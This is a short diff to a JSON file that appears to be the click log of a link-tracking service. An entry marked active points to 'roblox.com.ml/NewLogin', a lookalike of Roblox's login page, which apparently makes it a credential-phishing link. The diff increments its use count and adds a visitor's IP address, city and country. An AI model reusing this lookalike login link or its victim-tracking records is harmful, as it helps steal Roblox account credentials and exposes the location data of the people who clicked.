@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 694,
+    "useCount": 695,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5664,6 +5664,14 @@
         "city": "Angeles City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777133037866,
+        "ip": "105.213.182.88",
+        "country": "South Africa",
+        "city": "Germiston",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
       }
     ]
   },
